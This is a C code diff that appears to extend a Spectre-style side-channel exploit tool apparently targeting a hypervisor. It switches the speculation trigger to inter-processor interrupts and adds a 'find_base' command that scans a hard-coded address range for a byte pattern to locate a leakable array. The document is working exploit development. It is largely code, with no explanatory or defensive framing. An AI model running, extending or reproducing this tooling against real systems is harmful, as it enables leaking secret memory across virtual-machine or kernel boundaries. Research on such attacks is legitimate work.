@@ -24,7 +24,7 @@ enum half_spectre_method {
   METHOD_IPI,
   METHOD_YIELD,
 };
-static const enum half_spectre_method method = METHOD_YIELD;
+static const enum half_spectre_method method = METHOD_IPI;
 
 #define HYPERCALL_PATH_SIZE 127
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
@@ -292,6 +292,21 @@ void pin_cpu(void) {
   sched_setaffinity(0, sizeof(cpu_set_t), &s);
 }
 
+void *find_base(void *buf) {
+  fprintf(
+      stderr,
+      "On a diffent CPU, run access_min with index 0 to continiously bring the table into L1 data cache.\n");
+
+  scan_opts_t opts;
+  opts.start = 0xfeb8e3b0;
+  opts.end = 0x102fbd218;
+  opts.stride = 8;
+  unsigned char needle[] = {0xff, 0xff};
+  do_scan(opts, 2, (char *)needle);
+
+  return NULL;
+}
+
 void usage(void) {
   warnx("Unknown command! Supported commands are\n"
         "\tdetermine\n"
@@ -300,6 +315,7 @@ void usage(void) {
         "\ttest_spectre\n"
         "\taccess_min\n"
         "\tfind_min\n"
+        "\tfind_base\n"
         "\tapic\n"
         "\tl1tf");
 }
@@ -338,6 +354,9 @@ int main(int argc, char *argv[argc]) {
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
+  } else if (!strcmp(argv[1], "find_base")) {
+    void *base = find_base(leak_page);
+    printf("Base of array: %p\n", base);
   } else if (!strcmp(argv[1], "apic")) {
     const long msr = 0x1B;
     long nr_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
